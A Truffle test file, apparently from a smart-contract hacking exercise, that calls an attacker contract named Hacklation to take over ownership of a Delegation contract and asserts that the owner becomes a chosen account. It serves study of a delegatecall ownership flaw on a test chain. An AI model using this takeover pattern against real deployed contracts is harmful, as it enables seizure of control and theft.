const Delegate = artifacts.require("Delegation");
const Delegation = artifacts.require('Delegation');
const Hacklation = artifacts.require('Hacklation');


contract('Delegation', (accounts) => {
    let delegate;
    let delegation;
    let hacklation;

    beforeEach( async () => {
        delegate = await Delegate.deployed();
        delegation = await Delegation.deployed();
        hacklation = await Hacklation.deployed();
    })
    

    it('call hack', async () => {
        console.log('delegation owner before kill is:', await delegation.owner());

        await hacklation.kill({from: accounts[2]});

        console.log("delegation address is:", await delegation.address);
        console.log("hacklation address is:", await hacklation.address);
        const diocane = await hacklation.instance();
        console.log("instance on hackl is:", diocane);
        console.log("acounts 2 is:", accounts[2]);
        const newOwner = await delegation.owner();
        assert.equal(newOwner, accounts[2]);
    })
})

